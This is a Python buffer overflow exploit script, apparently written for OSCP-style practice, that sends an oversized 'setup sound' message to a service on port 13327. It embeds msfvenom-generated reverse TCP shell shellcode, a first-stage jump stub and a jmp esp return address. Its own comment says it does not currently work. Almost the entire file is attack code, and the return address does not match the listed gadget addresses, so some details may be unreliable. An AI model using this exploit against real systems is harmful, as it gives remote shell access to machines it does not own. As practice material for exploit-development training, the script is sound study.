#!/usr/bin/python
# the exploit currently does not work, probably because my system uses DEP.
import socket
ip = "127.0.0.1"

# at crash esp points to the end of the string, and we have only seven
# bytes left for out shellcode which is too short even for an
# egghunter. however it suffices for a first stage.

# however at crash eax points to "setup sound".
# Thus we can jump to eax + 12

# root@kali:~/oscp# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
# nasm > add eax, 12
# 00000000  83C00C            add eax,byte +0xc
# nasm > jmp eax
# 00000000  FFE0              jmp eax
fst_stage="\x83\xc0\x0c\xff\xe0"

# root@kali:~/oscp# msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c -a x86 --platform linux -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 95 (iteration=0)
# x86/shikata_ga_nai chosen with final size 95
# Payload size: 95 bytes
# Final size of c file: 425 bytes
shellcode=("\xda\xd2\xd9\x74\x24\xf4\x5a\xbf\xd0\xdd\x40\x0b\x29\xc9\xb1"
"\x12\x31\x7a\x17\x83\xea\xfc\x03\xaa\xce\xa2\xfe\x7b\x2a\xd5"
"\xe2\x28\x8f\x49\x8f\xcc\x86\x8f\xff\xb6\x55\xcf\x93\x6f\xd6"
"\xef\x5e\x0f\x5f\x69\x98\x67\x1f\x89\x5a\x76\xb7\x8b\x5a\x69"
"\x1b\x05\xbb\x39\xc5\x45\x6d\x6a\xb9\x65\x04\x6d\x70\xe9\x44"
"\x05\xe5\xc5\x1b\xbd\x91\x36\xf3\x5f\x0b\xc0\xe8\xcd\x98\x5b"
"\x0f\x41\x15\x91\x50")

pad = "\x90"*16

# an address pointing to jmp esp
# [0x08059358]> afl~mai
# 0x08059358    1 6            sym.imp.__libc_start_main
# [0x08059358]> s 0x08059358
# [0x08059358]> /c jmp esp
# 0x081349c7   # 2: jmp esp
# 0x08134f87   # 2: jmp esp
# 0x08134fc7   # 2: jmp esp
# 0x08135087   # 2: jmp esp

ret_addr = "\xb7\x44\x13\x08"

buf="\x11(setup sound " + pad + shellcode + "A"*(4368-16-95) + ret_addr + fst_stage + "CC" + "\x90\x00#"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("\nSending evil buffer...")
    s.connect((ip, 13327))
    data = s.recv(1024)     # receive banner
    print(data)             # print banner
        
    s.send(buf) # overflow!
    s.close()               # close socket
except:
    print("Could not connect!")
    raise
